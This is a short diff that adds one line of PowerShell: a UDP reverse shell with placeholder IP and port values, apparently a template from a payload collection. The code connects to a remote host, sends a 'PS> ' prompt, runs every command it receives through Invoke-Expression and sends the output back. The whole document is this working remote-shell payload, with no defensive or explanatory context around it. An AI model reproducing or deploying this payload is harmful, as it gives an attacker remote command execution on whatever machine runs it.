@@ -1,0 +1,2 @@
+$c=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Parse("-IP-",-PORT-);$a=New-Object System.Net.Sockets.UDPClient(-PORT-);[byte[]]$y=0..255|%{0};$s=([text.encoding]::ASCII).GetBytes('PS> ');$a.Send($s,$s.Length,$c);while($true){;$r=$a.Receive([ref]$c);$d=([text.encoding]::ASCII).GetString($r);$b=(iex $d 2>&1 | Out-String );$s=([text.encoding]::ASCII).GetBytes($b);$a.Send($s,$s.Length,$c)};$a.Close()
+
